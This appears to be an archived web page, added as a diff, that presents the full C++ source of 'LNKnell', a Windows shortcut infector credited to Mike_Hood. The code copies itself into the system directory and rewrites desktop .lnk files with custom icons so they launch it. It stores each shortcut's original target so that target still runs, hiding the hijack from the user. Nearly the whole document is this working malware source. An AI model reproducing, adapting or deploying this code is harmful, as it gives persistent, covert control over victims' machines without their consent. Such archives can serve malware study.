@@ -1,0 +1,275 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html>
+<head>
+
+<link href="../../viewer/css/style2.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+
+<div class="menu">
+<div class="menuitem"><a href="../../viewer/html/sources.html">Return to previous menu</a></div>
+
+</div>
+
+<div class="title">LNKnell<br/></div>
+<div class="author">Mike_Hood<br/></div>
+
+
+<xmp>
+
+/*
+************************************************************************************************
+
+  Name       : LNKnell
+  Language   : C++
+  Type       : Windows shortcut file (.lnk) infector
+  Author     : Mike_Hood
+
+************************************************************************************************
+
+  Description: LNKnell copies itself in system directory and changes the original target path
+               of .lnk files in the desktop with its path. LNKnell modifies only the shortcuts
+			   that haven't the default icon, this is because after the modification of the
+			   target path the icon would change to the exe default icon and the user could 
+			   notice the difference...
+			   The program also changes the description string of the shortcut and use it as a
+			   signature, saves the old target path and the old show (SW_) command as arguments
+			   for the command-line.
+			   When LNKnell is executed by a shortcut it takes the path and the show-command of
+			   the old target linked and executes it.
+
+************************************************************************************************
+
+  Thanks to  : Jesse Hager for reverse-engineering the Windows Shortcut File format
+               WarGame :)
+			   Simon The Monk, thanks for the movies... :)
+
+************************************************************************************************
+*/
+
+
+#include<iostream.h>
+#include<shlobj.h>
+#include<stdio.h>
+#include<windows.h>
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+
+	DWORD BufferSize=MAX_PATH, LnkFileAttributes, LnkSize=0, ReadBytes;
+	HANDLE SearchHandle, LnkHandle;
+	HKEY hKey;
+	unsigned char DesktopPath[MAX_PATH], *LnkBuffer=NULL;
+	WIN32_FIND_DATA w32;
+
+	// Get desktop path
+	if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, KEY_QUERY_VALUE, &hKey)!=ERROR_SUCCESS)
+	{
+		ExitProcess(0);
+	}
+
+	if(RegQueryValueEx(hKey, "Desktop", 0, NULL, DesktopPath, &BufferSize)!=ERROR_SUCCESS)
+	{
+		RegCloseKey(hKey);
+	}
+
+	// Set the desktop as current directory
+	SetCurrentDirectory((char*)DesktopPath);
+
+
+
+
+	char MyPath[MAX_PATH], LNKnellPath[MAX_PATH];
+
+
+	// Get the current path of LNKnell
+	GetModuleFileName(NULL, MyPath, MAX_PATH);
+
+	// Get the path of the system directory
+	GetSystemDirectory(LNKnellPath, MAX_PATH);
+
+	// Create a new path for LNKnell
+	lstrcat(LNKnellPath, "\\LNKnell.exe");
+
+	// Copy LNKnell in the system directory
+	CopyFile(MyPath, LNKnellPath, TRUE);
+
+
+
+	
+	// Initialize the COM library on the current thread 
+	CoInitialize(NULL);
+
+	
+	HRESULT hres; 
+    IShellLink* psl;
+	char szGotPath[MAX_PATH];
+	WIN32_FIND_DATA wfd;
+	int piShowCmd=1;
+
+	
+	// Get a pointer to the IShellLink interface
+	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, reinterpret_cast<void**>(&psl));
+	if (SUCCEEDED(hres))
+	{
+		IPersistFile* ppf = NULL;
+		
+		//Get a pointer to the IPersistFile interface
+		hres = psl->QueryInterface(IID_IPersistFile, reinterpret_cast<void**>(&ppf));
+		if (SUCCEEDED(hres))
+		{
+				WCHAR wsz[MAX_PATH];
+				char *LinkName=NULL;
+				
+				// Search for .lnk files
+				if((SearchHandle = FindFirstFile("*.LNK", &w32))!=INVALID_HANDLE_VALUE)
+					do
+					{
+						// Save attributes of the file to modify
+						LnkFileAttributes = GetFileAttributes(w32.cFileName);
+						
+						// Open .lnk file
+						LnkHandle = CreateFile(w32.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+						if(LnkHandle==INVALID_HANDLE_VALUE)
+						{
+							ExitProcess(0);
+						}
+		
+						// Get .lnk file size
+						LnkSize = GetFileSize(LnkHandle, NULL);
+
+						// Allocate LnkSize bytes from the heap
+						LnkBuffer = (unsigned char *)GlobalAlloc(GMEM_FIXED|GMEM_ZEROINIT, LnkSize);
+
+						// Read all data in the file
+						ReadFile(LnkHandle, LnkBuffer, LnkSize, &ReadBytes, NULL);
+						
+						// Close the handle
+						CloseHandle(LnkHandle);
+						
+						unsigned int i = 20;
+
+						// Read the flags of the .lnk file
+						unsigned int dwFlags = (unsigned int) LnkBuffer[i]; //little endian format
+						dwFlags |= (((unsigned int) LnkBuffer[++i]) << 8);
+						dwFlags |= (((unsigned int) LnkBuffer[++i]) << 16);
+						dwFlags |= (((unsigned int) LnkBuffer[++i]) << 24);
+
+						// Check if the link has a custom icon
+						bool bHasCustomIcon = (dwFlags & 0x00000040) ? true : false;
+
+						if(bHasCustomIcon==true)
+						{
+								
+							LinkName = w32.cFileName;
+								
+							// Ensure that the string is Unicode
+							MultiByteToWideChar(CP_ACP, 0, LinkName, -1,wsz, MAX_PATH);
+
+							// Load the shortcut
+							hres = ppf->Load(wsz, STGM_READ);
+							if (SUCCEEDED(hres)) 
+							{	
+
+								char DescriptionString[256];
+								
+								// Get the description string of the .lnk file
+								hres = psl->GetDescription(DescriptionString, 256);
+
+								 if(lstrcmp(DescriptionString, "LNKnell"))
+								 {
+									 
+									 // Get the path to the link target
+									hres = psl->GetPath(szGotPath, MAX_PATH, (WIN32_FIND_DATA *)&wfd, SLGP_SHORTPATH );
+
+									// Get the show (SW_) command for the shell link object
+									hres = psl->GetShowCmd(&piShowCmd);
+
+									char Args[512];
+
+									// Create new command-line arguments
+									wsprintf(Args, "*%s*%d", szGotPath, piShowCmd);
+								
+									// Set the command-line arguments
+									hres = psl->SetArguments(Args);
+								
+									// Set the new target path
+									hres = psl->SetPath(LNKnellPath);
+								
+									// Set the show command to SW_SHOWNORMAL
+									hres = psl->SetShowCmd(SW_SHOWNORMAL);
+
+									// Set the new description string
+									hres = psl->SetDescription("LNKnell");
+								
+									// Save the link by calling IPersistFile::Save.
+									hres = ppf->Save(wsz, FALSE);
+								
+									// Resolve the link
+									hres = psl->Resolve(NULL, SLR_ANY_MATCH);
+
+								 }
+							
+							}
+				
+						}
+
+						// Free the LnkBuffer and invalidate its handle 
+						GlobalFree(LnkBuffer);
+						
+						// Restore the old attributes
+						SetFileAttributes(w32.cFileName, LnkFileAttributes);
+					
+					} // Search for another .lnk file
+					while(FindNextFile(SearchHandle, &w32));
+					
+					// Release the pointer to the IPersistFile interface
+					ppf->Release();
+		}
+		
+		// Release the pointer to the IShellLink interface
+		psl->Release();
+	}
+	
+	// Uninitialize the COM library on the current thread
+	CoUninitialize();
+
+	char CommandLineString[512];
+
+	// Get a pointer to the command-line string
+	lstrcpy(CommandLineString, GetCommandLine());
+	MessageBox(NULL, CommandLineString, "Hello", MB_OK);
+
+	char token[]="*";
+	char *Arg1, *Arg2, *Arg3;
+
+	// Check if the string has the token
+	if((strchr(CommandLineString, '*'))!=NULL)
+	{
+
+		// Get the different arguments
+		Arg1 = strtok(CommandLineString, token);
+		Arg2 = strtok(NULL, token);
+		Arg3 = strtok(NULL, token);
+		
+		int intArg3=1;
+
+		// Get the integer to pass as show command to ShellExecute()
+		intArg3 = Arg3[0]-48;
+	
+
+		// Execute the original target of the .lnk file
+		ShellExecute(NULL, "open", Arg2, NULL, NULL, intArg3);
+	}
+	
+
+	return 0;
+}
+
+</xmp>
+</div>
+
+</body>
+</html>
